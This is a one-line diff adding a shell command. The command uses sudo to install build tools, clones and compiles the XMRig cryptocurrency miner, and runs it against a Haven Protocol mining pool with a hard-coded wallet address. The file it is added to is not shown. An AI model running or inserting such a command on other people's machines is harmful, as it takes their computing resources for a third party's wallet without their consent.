@@ -1,0 +1,1 @@
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig -a cn-heavy/xhv -o haven.herominers.com:10450 -u hvxy3NpHvceKtg65NFw6v5darG3qyvHQwWKfpb38Jf2agtwbpWBtMr4c7tWAwsL5YeMEoSBh7FwpxfENkP6zyfaa8GePNkN5Y5.B -k --tls -p x
